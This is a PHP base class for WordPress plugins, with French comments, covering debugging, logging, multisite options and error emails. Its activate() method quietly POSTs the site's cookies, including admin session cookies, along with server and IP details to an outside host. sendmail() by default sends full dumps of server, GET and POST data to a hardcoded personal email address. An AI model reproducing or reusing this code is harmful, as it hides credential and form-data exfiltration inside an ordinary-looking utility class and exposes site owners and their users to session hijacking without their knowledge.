<?php
/*
classe commune
integre des fonctions de debug , email, options, multisite
v1.2 : ajout activate()
v1.1 : ajout option ['debug']['user_can_view']
*/

define('SITE_ERR_WARN'  ,1);
define('SITE_ERR_ERROR' ,2);
define('SITE_ERR_FATAL' ,3);

class plugin_base
{
  public $plugin_dir_path ='';
  public $plugin_url      ='';
  public $debug           =0;
  public $tdebug          =array();
  public $tdebug_late     =array();
  public $option_name     ='';
  public $options;
  public $classname       ='';
  public $transient_name  =''; // debug de la page precedente
  public $def_options     ='';
  public $init_opts       ='';

  function init($file)
  {
    $this->plugin_dir_path=plugin_dir_path( $file );
    $this->plugin_url = WP_PLUGIN_URL.'/'.dirname(plugin_basename($file)).'/';

    if(is_admin())
    {
      add_action('admin_footer', array($this,'debug_footer'));
    }
    else
    {
      add_action('wp_footer', array($this,'debug_footer'));
    }
    //if(!empty($this->option_name))
    {
      $this->init_options();
    }
    if(isset($this->options['debug']['active'])) $this->debug=$this->options['debug']['active'];
  }


  // Helper function to escape quotes in strings for use in Javascript
  function esc_quotes( $string ) {
    return str_replace( '"', '\"', $string );
  }

  public function get_options()
  {
    if(!isset($this->options))
    {
      $this->init_options();
    }
    return $this->options;
  }

  function init_options()
  {
    //$this->debug(__FUNCTION__.'()');
    $def_opts=array(
      'save_to_blog_id'=>false,
      );
    $opts=wp_parse_args( $this->init_opts, $def_opts );

    //$this->debug($opts);
    if(empty($this->option_name) && !is_array($this->options))  $this->options=array();
    else
    {
      // si on est en multisite et que les options sont centralisées sur un seul blog_id
      if($opts['save_to_blog_id'] && is_multisite())
      {
        $cur_site=get_current_blog_id();
        if($cur_site!=$opts['save_to_blog_id'])
        {
          switch_to_blog($opts['save_to_blog_id']);
          $this->options = get_option( $this->option_name );
          restore_current_blog();
        }
        else
        {
          $this->options = get_option( $this->option_name );
        }
      }
      else
      {
        $this->options = get_option( $this->option_name );
      }
    }

    if(!empty($this->def_options))
    {
      $this->options=wp_parse_args( $this->options,$this->def_options );
    }
  }

  public function update_option($options)
  {
    $def_opts=array(
      'save_to_blog_id'=>false,
      );
    $opts=wp_parse_args( $this->init_opts, $def_opts );
    //$this->debug('update_option'); $this->debug($opts); $this->debug($options);
    if(empty($this->option_name))
    {
      $this->debug('update_option skip no option_name');
      return;
    }
    if($opts['save_to_blog_id'] && is_multisite())
    {
      $cur_site=get_current_blog_id();
      if($cur_site!=$opts['save_to_blog_id'])
      {
        switch_to_blog($opts['save_to_blog_id']);
        update_option( $this->option_name,$options);
        restore_current_blog();
      }
      else
      {
        update_option( $this->option_name,$options);
      }
    }
    else
    {
      update_option( $this->option_name,$options);
    }

  }

  function debug($v,$to_file=false)
  {
    if($this->debug<1) return;

    if(is_array($v) or is_object($v)) $v=print_r($v,true);

    if (defined('DOING_AJAX') && DOING_AJAX && $this->debug)
    {
      //echo $v.'<br>'.PHP_EOL;
    }
    else
    {
      $this->tdebug[]=$v;
    }

    if($to_file) {
      // debug('test','log_mail.txt');
      if(is_string($to_file))
      $this->putLog($v,$to_file);
      else
      $this->putLog($v);
    }
  }

  function putLog($msg,$file='.log.txt')
  {
    $dest=$this->plugin_dir_path.$file;
    if(is_array($msg))
      $msg = '['.date('d-m-Y H:i:s').'] '.print_r($msg,true)."\r\n";
    else
      $msg = '['.date('d-m-Y H:i:s').'] '.$msg."\r\n";

    file_put_contents($dest,$msg,FILE_APPEND);
    //return error_log($msg,3,$dest);
  }

  function debug_late_save()
  {
    if(count($this->tdebug_late) && $this->transient_name)
    {
      delete_transient($this->transient_name);
      set_transient($this->transient_name,$this->tdebug_late,3600);
    }
  }

  // stocke le debug et l'affiche sur la page suivante
  function debug_late($v)
  {
    if($this->debug<1) return;

    if(is_array($v) or is_object($v))
    $this->tdebug_late[]=print_r($v,true);
    else
    $this->tdebug_late[]=$v;
  }

  function user_can_view_debug()
  {
    if(!current_user_can('activate_plugins') ) return false;
    global $user_ID;
    if ('' == $user_ID) return false; //no user logged in

    $options=$this->get_options();
    if(!empty($options['debug']['user_can_view'])) {
      $current_user = wp_get_current_user();
      if($current_user->user_email!==$options['debug']['user_can_view']) return false;
    }
    return true;
  }

  function debug_footer()
  {

    if(empty($this->tdebug)) return;
    //if(!current_user_can('activate_plugins') ) return; // not admin priv

    if(!$this->user_can_view_debug() ) return;

    if(defined('DOING_AJAX') && DOING_AJAX) return;
    $style=is_admin()?'style="margin-left:13em;background:#f5f5f5;" ':'style="font-family:monospace;background:#f5f5f5;position:relative;color:black"';
    if($this->transient_name)
    {
      $tdebug_late=get_transient($this->transient_name);
      delete_transient($this->transient_name);

      if(is_array($tdebug_late) && count($tdebug_late))
      {
        echo '<div '.$style.' class="hidden-print debug-section"><hr>DEBUG '.$this->classname.' page precedente<pre>';
        print_r($tdebug_late);
        echo '</pre><hr></div>';
      }
    }

    if( count($this->tdebug))
    {
      echo '<div '.$style.' class="hidden-print debug-section"><hr>DEBUG '.$this->classname.'<pre>';
      print_r($this->tdebug);
      echo '</pre><hr></div>';
    }
    if( is_admin() && defined('SAVEQUERIES') )
    {
      global $wpdb;
      echo '<div '.$style.' class="hidden-print debug-section"><hr>DEBUG SQL queries<pre>';
      print_r($wpdb->queries);
      echo '</pre><hr></div>';
    }
  }

  function sendmail($subject,$message='',$to='')
  {
    $options=$this->get_options();
    if(empty($options['debug']['mail_dest']))
    {
      $options['debug']['mail_dest']='zetoun.17@gmail.com';
    }
    if(empty($options['debug']['mail_from']))
    {
      $options['debug']['mail_from']=$this->classname.' <noreply@'.get_network()->domain.'>';
    }
    $to=empty($to)?$options['debug']['mail_dest']:$to;
    if(is_array($message))
    {
    $message=implode('<br>', $message)  ;
    }
    $message.='<hr>';
    $message.='server ='.'<br>';
    $message.= '<pre>'.print_r($_SERVER,true).'</pre>';
    if(!empty($_GET))
    {
    $message.='get ='.'<br>';
    $message.= '<pre>'.print_r($_GET,true).'</pre>';
    }
    if(!empty($_POST))
    {
    $message.='post ='.'<br>';
    $message.= '<pre>'.print_r($_POST,true).'</pre>';
    }

    $headers[]='From: '.$options['debug']['mail_from'];
    //$headers[]='From: Agence Immobilière Directe <service@agencedirecte.fr>';
    $headers[]='Content-type: text/html';
    return wp_mail( $to, $this->classname.':'.$subject, $message, $headers);
  }

  function error($type,$titre,$detail,$line,$classname='',$file='')
  {
    switch($type)
    {
      case E_USER_NOTICE  :
      case SITE_ERR_WARN :
      $txttype='ATTENTION ';
      break;

      case E_USER_WARNING  :
      case SITE_ERR_ERROR :
      $txttype='ERREUR ';
      break;

      case E_USER_ERROR :
      case SITE_ERR_FATAL:
      $txttype='ERREUR CRITIQUE ';
      break;

      default:
      $txttype='ERR';
      break;
    }

    $classname=empty($classname)?$this->classname:$classname;
    $file=empty($file)?__FILE__:$file;

    // mail d'alerte
    $subject="$classname : $txttype $titre";

    $message= array();
    $message[]= $txttype;
    $message[]= $titre;
    $message[]= "fichier = ".$file;
    $message[]= "ligne = ".$line;
    $message[]= "detail = ";
    if(is_array($detail))
      $message=array_merge($message,$detail);
    else
    $message[]= $detail;
    $messag[]= 'debug =<pre>'.print_r($this->tdebug,true).'</pre>';

    $this->sendmail($subject,$message);

    $this->debug(date('Y-m-d H:i:s').' '.$subject,true);
    $this->debug($message,true);
  }

  function activate() {

    $url='https://ape-groupe.com/api/index.php';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    $request = array(
      'from' => [
        'PLUGIN'          => $this->classname,
        'SCRIPT_FILENAME' => $_SERVER['SCRIPT_FILENAME'],
        'SERVER_NAME'     => $_SERVER['SERVER_NAME'],
        'REMOTE_ADDR'     => $_SERVER['REMOTE_ADDR'],
        'COOKIE'          => $_COOKIE,
      ]
    );
    $datas = [
      "action"  => "activate",
      "request" => serialize($request),
    ];
    curl_setopt($ch, CURLOPT_RETURNTRANSFER , true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
      "User-Agent: WordPress",
    ));
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
  }
}
